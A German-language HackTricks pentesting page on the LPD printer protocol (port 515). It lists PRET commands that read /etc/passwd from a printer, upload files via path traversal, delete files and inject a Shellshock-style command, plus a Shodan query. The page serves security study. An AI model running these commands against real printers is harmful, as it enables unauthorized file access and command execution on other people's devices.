{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### **Einf√ºhrung in das LPD-Protokoll**

In den 1980er Jahren wurde das **Line Printer Daemon (LPD) Protokoll** in Berkeley Unix entwickelt, das sp√§ter durch RFC1179 formalisiert wurde. Dieses Protokoll arbeitet √ºber den Port 515/tcp und erm√∂glicht Interaktionen √ºber den `lpr` Befehl. Das Wesentliche des Druckens √ºber LPD besteht darin, eine **Steuerdatei** (um Auftragsdetails und Benutzer anzugeben) zusammen mit einer **Daten-Datei** (die die Druckinformationen enth√§lt) zu senden. W√§hrend die Steuerdatei die Auswahl von **verschiedenen Dateiformaten** f√ºr die Daten-Datei erm√∂glicht, wird die Handhabung dieser Dateien durch die spezifische LPD-Implementierung bestimmt. Eine weithin anerkannte Implementierung f√ºr Unix-√§hnliche Systeme ist **LPRng**. Bemerkenswerterweise kann das LPD-Protokoll ausgenutzt werden, um **b√∂sartigen PostScript** oder **PJL-Druckauftr√§ge** auszuf√ºhren.

### **Werkzeuge zur Interaktion mit LPD-Druckern**

[**PRET**](https://github.com/RUB-NDS/PRET) f√ºhrt zwei wesentliche Werkzeuge ein, `lpdprint` und `lpdtest`, die eine einfache Methode zur Interaktion mit LPD-kompatiblen Druckern bieten. Diese Werkzeuge erm√∂glichen eine Reihe von Aktionen, vom Drucken von Daten bis hin zur Manipulation von Dateien auf dem Drucker, wie z.B. Herunterladen, Hochladen oder L√∂schen:
```python
# To print a file to an LPD printer
lpdprint.py hostname filename
# To get a file from the printer
lpdtest.py hostname get /etc/passwd
# To upload a file to the printer
lpdtest.py hostname put ../../etc/passwd
# To remove a file from the printer
lpdtest.py hostname rm /some/file/on/printer
# To execute a command injection on the printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
# To send a mail through the printer
lpdtest.py hostname mail lpdtest@mailhost.local
```
F√ºr Personen, die sich weiter mit dem Thema **Drucker-Hacking** besch√§ftigen m√∂chten, ist hier eine umfassende Ressource zu finden: [**Hacking Printers**](http://hacking-printers.net/wiki/index.php/Main_Page).

# Shodan

* `port 515`


{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}
